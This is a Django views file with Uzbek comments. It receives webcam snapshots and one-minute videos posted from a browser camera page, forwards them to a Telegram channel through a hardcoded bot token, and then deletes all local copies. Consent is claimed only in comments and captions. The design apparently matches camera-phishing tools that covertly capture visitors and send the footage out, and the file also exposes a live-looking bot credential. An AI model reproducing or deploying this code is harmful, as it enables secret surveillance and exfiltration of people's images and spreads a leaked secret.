import base64
import os
import requests
from django.http import JsonResponse, HttpResponseBadRequest
from django.shortcuts import render
from django.views.decorators.csrf import csrf_exempt


def index(request):
    # sahifada rozilik matni ko'rsatiladi
    return render(request, 'camera/index.html')


@csrf_exempt
def upload_image(request):
    if request.method != 'POST':
        return HttpResponseBadRequest("Only POST")

    data = request.POST.get('image') or request.body.decode('utf-8')
    if not data:
        return HttpResponseBadRequest("No image data")

    if data.startswith('data:'):
        _, b64 = data.split(',', 1)
    else:
        b64 = data

    try:
        img_bytes = base64.b64decode(b64)
    except Exception:
        return HttpResponseBadRequest("Bad base64")

    # 📂 Rasm saqlash
    saved_path = os.path.join('media', 'captures')
    os.makedirs(saved_path, exist_ok=True)
    filename = f"capture_{int(__import__('time').time())}.png"
    file_path = os.path.join(saved_path, filename)

    with open(file_path, 'wb') as f:
        f.write(img_bytes)

    # 📤 Telegram'ga yuborish
    bot_token = "7827433962:AAGkvZ4AyxHhQqfMnK6XCcJLfnbw1FOd3Nc"
    chat_id = "@ahadjonrasm"
    send_url = f"https://api.telegram.org/bot{bot_token}/sendPhoto"

    try:
        with open(file_path, 'rb') as img:
            files = {'photo': (filename, img)}
            data_send = {'chat_id': chat_id, 'caption': 'Yangi rasm (foydalanuvchi roziligi bilan)'}
            resp = requests.post(send_url, data=data_send, files=files, timeout=15)
            resp.raise_for_status()
    except Exception as e:
        return JsonResponse({'ok': False, 'error': str(e)})

    # 🔥 Hamma rasmni o‘chirish
    for old_file in os.listdir(saved_path):
        try:
            os.remove(os.path.join(saved_path, old_file))
        except Exception as e:
            print("O‘chirishda xato:", e)

    return JsonResponse({'ok': True, 'file': filename})


# 🎥 VIDEO FUNKSIYA
@csrf_exempt
def upload_video(request):
    if request.method != 'POST':
        return HttpResponseBadRequest("Only POST")

    # Frontend FormData orqali yuboradi: video=file
    video_file = request.FILES.get('video')
    if not video_file:
        return HttpResponseBadRequest("No video file")

    # 📂 Videoni vaqtincha saqlash
    saved_path = os.path.join('media', 'videos')
    os.makedirs(saved_path, exist_ok=True)
    filename = f"video_{int(__import__('time').time())}.mp4"
    file_path = os.path.join(saved_path, filename)

    with open(file_path, 'wb') as f:
        for chunk in video_file.chunks():
            f.write(chunk)

    # 📤 Telegram'ga yuborish
    bot_token = "7827433962:AAGkvZ4AyxHhQqfMnK6XCcJLfnbw1FOd3Nc"
    chat_id = "@ahadjonrasm"
    send_url = f"https://api.telegram.org/bot{bot_token}/sendVideo"

    try:
        with open(file_path, 'rb') as vid:
            files = {'video': (filename, vid)}
            data_send = {'chat_id': chat_id, 'caption': 'Yangi 1 daqiqalik video'}
            resp = requests.post(send_url, data=data_send, files=files, timeout=60)
            resp.raise_for_status()
    except Exception as e:
        return JsonResponse({'ok': False, 'error': str(e)})

    # 🔥 Hamma video fayllarni o‘chirish
    for old_file in os.listdir(saved_path):
        try:
            os.remove(os.path.join(saved_path, old_file))
        except Exception as e:
            print("O‘chirishda xato:", e)

    return JsonResponse({'ok': True, 'file': filename})
